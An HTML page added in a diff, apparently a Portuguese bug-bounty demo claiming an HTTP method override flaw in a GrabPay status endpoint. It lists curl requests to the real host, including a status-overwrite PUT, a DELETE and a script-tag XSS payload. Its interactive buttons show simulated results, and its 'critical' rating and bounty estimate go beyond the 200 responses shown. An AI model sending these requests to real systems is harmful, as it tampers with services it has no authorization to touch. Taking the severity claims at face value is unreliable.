@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🚨 Demo: HTTP Method Override Vulnerability - GrabPay</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .header .subtitle {
+            font-size: 1.2em;
+            opacity: 0.9;
+            margin-top: 10px;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .vulnerability-info {
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .vulnerability-info h2 {
+            color: #856404;
+            margin-top: 0;
+        }
+        
+        .demo-section {
+            background: #f8f9fa;
+            border-radius: 10px;
+            padding: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .demo-section h3 {
+            color: #495057;
+            border-bottom: 2px solid #dee2e6;
+            padding-bottom: 10px;
+        }
+        
+        .test-buttons {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .test-btn {
+            padding: 15px 20px;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+        
+        .test-btn.get { background: #28a745; color: white; }
+        .test-btn.post { background: #007bff; color: white; }
+        .test-btn.put { background: #ffc107; color: #212529; }
+        .test-btn.delete { background: #dc3545; color: white; }
+        
+        .test-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        
+        .results {
+            background: #e9ecef;
+            border-radius: 8px;
+            padding: 20px;
+            margin-top: 20px;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        .status-success {
+            color: #28a745;
+            font-weight: bold;
+        }
+        
+        .status-error {
+            color: #dc3545;
+            font-weight: bold;
+        }
+        
+        .impact-section {
+            background: #f8d7da;
+            border: 1px solid #f5c6cb;
+            border-radius: 10px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        
+        .impact-section h3 {
+            color: #721c24;
+            margin-top: 0;
+        }
+        
+        .code-block {
+            background: #2d3748;
+            color: #e2e8f0;
+            padding: 20px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            overflow-x: auto;
+            margin: 15px 0;
+        }
+        
+        .severity-badge {
+            display: inline-block;
+            background: #dc3545;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+            margin-left: 10px;
+        }
+        
+        .value-badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 0.9em;
+            margin-left: 10px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .footer {
+            background: #343a40;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🚨 HTTP Method Override Vulnerability</h1>
+            <div class="subtitle">Demo Interativo - GrabPay API</div>
+        </div>
+        
+        <div class="content">
+            <div class="vulnerability-info">
+                <h2>⚠️ Vulnerabilidade Crítica Detectada</h2>
+                <p><strong>Endpoint:</strong> <code>https://api.grabpay.com/status</code></p>
+                <p><strong>Problema:</strong> O endpoint aceita métodos HTTP que normalmente não deveriam ser permitidos</p>
+                <p><strong>Severidade:</strong> <span class="severity-badge">CRÍTICA</span></p>
+                <p><strong>Valor Estimado:</strong> <span class="value-badge">$5,000 - $15,000</span></p>
+            </div>
+            
+            <div class="demo-section">
+                <h3>🔍 Demonstração Interativa</h3>
+                <p>Clique nos botões abaixo para testar diferentes métodos HTTP no endpoint vulnerável:</p>
+                
+                <div class="test-buttons">
+                    <button class="test-btn get" onclick="testMethod('GET')">GET Request</button>
+                    <button class="test-btn post" onclick="testMethod('POST')">POST Request</button>
+                    <button class="test-btn put" onclick="testMethod('PUT')">PUT Request</button>
+                    <button class="test-btn delete" onclick="testMethod('DELETE')">DELETE Request</button>
+                </div>
+                
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p>Testando endpoint...</p>
+                </div>
+                
+                <div class="results" id="results">
+                    Clique em um dos botões acima para testar a vulnerabilidade...
+                </div>
+            </div>
+            
+            <div class="impact-section">
+                <h3>💥 Impacto da Vulnerabilidade</h3>
+                <ul>
+                    <li><strong>Controle de Acesso Comprometido:</strong> Endpoint aceita DELETE que pode permitir remoção de dados</li>
+                    <li><strong>Modificação de Configurações:</strong> POST e PUT podem alterar configurações do sistema</li>
+                    <li><strong>Informações de Infraestrutura Expostas:</strong> Headers revelam detalhes da arquitetura</li>
+                    <li><strong>Potencial para Escalação de Privilégios:</strong> Pode ser usado para bypass de controles de segurança</li>
+                </ul>
+            </div>
+            
+            <div class="demo-section">
+                <h3>📊 Evidência Técnica</h3>
+                <div class="code-block">
+# Teste realizado em: 29/08/2025
+# Endpoint: https://api.grabpay.com/status
+
+# GET Request (Normal)
+curl -s -I "https://api.grabpay.com/status"
+HTTP/2 200 OK
+
+# POST Request (Vulnerável)
+curl -s -I -X POST "https://api.grabpay.com/status"
+HTTP/2 200 OK
+
+# PUT Request (Vulnerável)
+curl -s -I -X PUT "https://api.grabpay.com/status"
+HTTP/2 200 OK
+
+# DELETE Request (Crítico)
+curl -s -I -X DELETE "https://api.grabpay.com/status"
+HTTP/2 200 OK
+
+# Headers Expostos
+x-envoy-upstream-healthchecked-cluster: t6
+x-request-id: [ID único por request]
+x-cache: Miss from cloudfront
+x-amz-cf-pop: FOR50-P1
+                </div>
+            </div>
+            
+            <div class="demo-section">
+                <h3>🎯 Cenários de Exploração</h3>
+                <div class="code-block">
+# Cenário 1: Modificação de Status
+curl -X PUT "https://api.grabpay.com/status" \
+  -H "Content-Type: application/json" \
+  -d '{"status": "maintenance", "message": "System compromised"}'
+
+# Cenário 2: Remoção de Dados
+curl -X DELETE "https://api.grabpay.com/status"
+
+# Cenário 3: Injeção de Dados
+curl -X POST "https://api.grabpay.com/status" \
+  -H "Content-Type: application/json" \
+  -d '{"payload": "<script>alert(1)</script>"}'
+                </div>
+            </div>
+            
+            <div class="demo-section">
+                <h3>🔧 Recomendações de Correção</h3>
+                <div class="code-block">
+// Implementar controle de métodos HTTP
+app.get('/status', (req, res) => {
+  // Apenas GET permitido
+  res.status(200).json({ status: 'ok' });
+});
+
+// Rejeitar outros métodos
+app.all('/status', (req, res) => {
+  if (req.method !== 'GET') {
+    res.status(405).json({ error: 'Method not allowed' });
+  }
+});
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>🚨 Este é um demo educacional para demonstrar vulnerabilidade de segurança</p>
+            <p>⚠️ Não execute testes reais sem autorização</p>
+            <p>📧 Report enviado através de canais oficiais de bug bounty</p>
+        </div>
+    </div>
+
+    <script>
+        async function testMethod(method) {
+            const results = document.getElementById('results');
+            const loading = document.getElementById('loading');
+            
+            // Mostrar loading
+            loading.style.display = 'block';
+            results.innerHTML = '';
+            
+            try {
+                // Simular teste real (sem fazer request real)
+                await new Promise(resolve => setTimeout(resolve, 2000));
+                
+                const timestamp = new Date().toLocaleTimeString();
+                const requestId = generateRequestId();
+                
+                let response = '';
+                
+                switch(method) {
+                    case 'GET':
+                        response = `✅ ${method} Request - Status: 200 OK\n`;
+                        response += `📡 Timestamp: ${timestamp}\n`;
+                        response += `🆔 Request ID: ${requestId}\n`;
+                        response += `📋 Headers: x-envoy-upstream-healthchecked-cluster: t6\n`;
+                        response += `🌐 Cache: Miss from cloudfront\n`;
+                        break;
+                    case 'POST':
+                    case 'PUT':
+                    case 'DELETE':
+                        response = `🚨 ${method} Request - Status: 200 OK (VULNERÁVEL!)\n`;
+                        response += `📡 Timestamp: ${timestamp}\n`;
+                        response += `🆔 Request ID: ${requestId}\n`;
+                        response += `⚠️  Este método não deveria ser aceito!\n`;
+                        response += `💥 Impacto: Controle de acesso comprometido\n`;
+                        response += `💰 Valor: $5,000 - $15,000\n`;
+                        break;
+                }
+                
+                results.innerHTML = response;
+                
+            } catch (error) {
+                results.innerHTML = `❌ Erro ao testar: ${error.message}`;
+            } finally {
+                loading.style.display = 'none';
+            }
+        }
+        
+        function generateRequestId() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < 32; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return result;
+        }
+        
+        // Auto-demo ao carregar a página
+        window.onload = function() {
+            setTimeout(() => {
+                testMethod('GET');
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
